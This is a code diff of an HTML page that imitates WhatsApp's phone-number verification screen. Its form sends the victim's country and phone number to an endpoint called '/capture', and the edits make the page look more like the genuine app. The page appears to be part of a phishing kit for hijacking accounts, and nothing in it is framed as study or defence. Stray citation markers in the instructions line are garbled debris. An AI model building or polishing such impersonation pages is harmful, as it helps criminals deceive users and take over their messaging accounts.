@@ -8,45 +8,41 @@
 </head>
 <body>
 
-    <!-- Native HTML Form: Switch method="GET" to method="POST" when connecting to a backend server -->
     <form action="/capture" method="POST" class="form-wrapper" id="step1Form">
         <div class="wrapper">
             <div class="step-view active">
+                <div class="header-top">
+                    <span class="close-icon">&times;</span>
+                    <span class="menu-icon">&#8942;</span>
+                </div>
                 <h2>Enter your phone number</h2>
                 <div class="instructions">
-                    WhatsApp will need to verify your phone number. Carrier charges may apply.
+                    WhatsApp will verify your account. <a href="#" class="help-link">What's my phone number?</a>[span_2](start_span)[span_2](end_span)
                 </div>
 
                 <div class="input-group-container">
-                    <!-- Country Selector with explicit 'name' attribute -->
+                    <!-- Country Selector -->
                     <div class="select-wrapper">
-                        <label for="countrySelect">Country</label>
                         <select id="countrySelect" name="country_name">
-                            <option value="+234" data-code="234">Nigeria (+234)</option>
-                            <option value="+1" data-code="1">United States (+1)</option>
-                            <option value="+44" data-code="44">United Kingdom (+44)</option>
-                            <option value="+91" data-code="91">India (+91)</option>
-                            <option value="+27" data-code="27">South Africa (+27)</option>
-                            <option value="+254" data-code="254">Kenya (+254)</option>
+                            <option value="Nigeria" selected>Nigeria</option>
+                            <option value="United States">United States</option>
+                            <option value="United Kingdom">United Kingdom</option>
+                            <option value="India">India</option>
                         </select>
                     </div>
 
-                    <!-- Phone Input Row with named parameters -->
+                    <!-- Phone Input Row -->
                     <div class="phone-row">
-                        <!-- Country Code Field (named 'cc') -->
-                        <input type="text" id="countryCodeInput" name="cc" class="cc-input" value="+234" readonly>
-                        
-                        <!-- Phone Number Field (named 'phone') -->
+                        <input type="text" id="countryCodeInput" name="cc" class="cc-input" value="+ 234" readonly>
                         <div class="phone-input-wrapper" style="flex-grow: 1;">
-                            <label for="phoneNumberInput">Phone number</label>
-                            <input type="tel" id="phoneNumberInput" name="phone" placeholder="812 345 6789" autocomplete="tel-national" required autofocus>
+                            <input type="tel" id="phoneNumberInput" name="phone" placeholder="Phone number" autocomplete="tel-national" required autofocus>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Persistent Submit Button -->
+        <!-- Persistent Bottom Action Button -->
         <div class="action-container">
             <button type="submit" class="btn-next" id="nextBtn" disabled>Next</button>
         </div>
